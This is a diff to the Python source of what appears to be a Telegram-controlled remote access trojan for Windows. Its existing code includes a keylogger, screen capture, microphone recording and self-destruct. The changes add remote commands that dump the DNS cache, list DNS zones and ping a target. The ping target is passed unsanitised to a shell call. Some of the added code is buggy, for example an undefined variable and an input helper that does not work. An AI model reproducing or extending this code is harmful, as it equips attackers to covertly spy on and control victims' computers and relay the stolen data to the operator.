@@ -1,3 +1,11 @@
+#Todo
+#Split functions to classes
+#Solve bugs
+#Allow multi-keyboard capability
+#Add new features from the Master fork
+#Implement the new telepot MessageLoop() Class
+
+
 from PIL import ImageGrab  # /capture_pc
 from shutil import copyfile, copyfileobj, rmtree  # /ls, /pwd, /cd /copy
 from sys import argv, path, stdout  # console output
@@ -12,8 +20,9 @@ import proxy
 import pyaudio, wave  # /hear
 import telepot, requests  # telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
+from telepot.loop import MessageLoop
 import os, os.path, platform, ctypes
-import pyHook, pythoncom  # keylogger
+import pyHook, pythoncom  #keylogger
 import getpass
 import socket
 
@@ -45,6 +54,14 @@ def internalIP():
     return internal_ip.getsockname()[0]
 
 
+def user_input(bot, from_id, msg):
+    target = ''
+    bot.sendMessage(from_id, "What's the target?")
+
+    #target = msg['text']
+    target = checkchat_id(msg[0])
+    return target
+
 def on_chat_message(msg):
     # chat_id = msg['chat']['id']
     content_type, chat_type, chat_id = telepot.glance(msg)
@@ -58,6 +75,8 @@ def on_chat_message(msg):
         [InlineKeyboardButton(text='Tasklist: Returns the tasklist', callback_data='tasklist')],
         [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
         [InlineKeyboardButton(text='arp: Returns ARP Table', callback_data='arp')],
+        [InlineKeyboardButton(text='DNS_Cache: Returns the DNS cache', callback_data='dns')],
+        [InlineKeyboardButton(text='NSlookup: Returns the DNS table from the DNS server', callback_data='nslookup')]
     ])
     exec_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text='Capture_PC', callback_data='capture_pc')],
@@ -74,6 +93,7 @@ def on_chat_message(msg):
         [InlineKeyboardButton(text='run <target_file>', callback_data='run')],
         [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
         [InlineKeyboardButton(text='Upload', callback_data='upload')],
+        [InlineKeyboardButton(text='Ping: Ping a target', callback_data='ping')]
     ])
     bot_keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text='Self_Destruct', callback_data='self_destruct')],
@@ -91,9 +111,10 @@ def on_chat_message(msg):
 
 
 def on_callback_query(msg):
+    command = ''
     file_name = ''
     response = ''
-    command = ''
+    target = ''
     query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
     print('Callback Query:', query_id, from_id, query_data)
     if query_data == 'capture_pc':
@@ -106,6 +127,39 @@ def on_callback_query(msg):
     elif query_data == 'arp':
         bot.sendChatAction(from_id, 'typing')
         lines = os.popen('arp -a -N ' + internalIP())
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+        bot.sendMessage(from_id, response)
+    elif query_data == 'dns':
+        bot.sendChatAction(from_id, 'typing')
+        lines = os.popen('ipconfig /displaydns')
+        for line in lines:
+            line.replace('\n\n', '\n')
+            if len(line) > 2000:
+                response2 += line
+            else:
+                response += line
+        bot.sendMessage(from_id, response)
+        bot.sendMessage(from_id, response2)
+        #Too long, can't be sent - needs to be splited
+    elif query_data == 'nslookup':
+        bot.sendChatAction(from_id, 'typing')
+        lines = os.popen('nslookup -ls -d *')
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+        bot.sendMessage(from_id, response)
+    elif query_data == 'ping':
+        bot.sendChatAction(from_id, 'typing')
+        target = user_input(bot, from_id, msg)
+        print target
+        #
+        #    bot.sendMessage(from_id, "What's the target?")
+        #    bot.answerCallbackQuery()
+        #    target = query_data
+        #
+        lines = os.popen('ping '+ target)
         for line in lines:
             line.replace('\n\n', '\n')
             response += line
@@ -299,6 +353,7 @@ def on_callback_query(msg):
         response = os.getcwd()
         bot.sendMessage(from_id, response)
     elif query_data == 'tasklist':
+        response2 = ''
         lines = os.popen('tasklist /FI "STATUS eq RUNNING"')
         for line in lines:
             line.replace('\n\n', '\n')
@@ -306,6 +361,7 @@ def on_callback_query(msg):
                 response2 +=line
             else:
                 response += line
+        print len(response)
         bot.sendMessage(from_id, response)
         bot.sendMessage(from_id, response2)
     elif query_data == 'run':
@@ -429,7 +485,7 @@ with open(log_file, "a") as writing:
 
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = os.environ['11111111:111111111111111111111111111111111']  # you can set your environment variable as well
-token = '1111111111:111111111111111111111111111111111'
+token = '11111111:111111111111111111111111111111111'
 
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 # known_ids = ''
@@ -439,10 +495,12 @@ token = '1111111111:111111111111111111111111111111111'
 
 #appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
 
-known_ids = '11111111'
+known_ids = '111111111'
 bot = telepot.Bot(token)
-bot.message_loop({'chat': on_chat_message,
-                  'callback_query': on_callback_query})
+MessageLoop(bot, {'chat': on_chat_message,
+                  'callback_query': on_callback_query}).run_as_thread()
+#bot.message_loop({'chat': on_chat_message,
+#                  'callback_query': on_callback_query})
 if len(known_ids) > 0:
     helloWorld = platform.uname()[1] + ": I'm up. Type anything to get the keyboard layout."
     print helloWorld
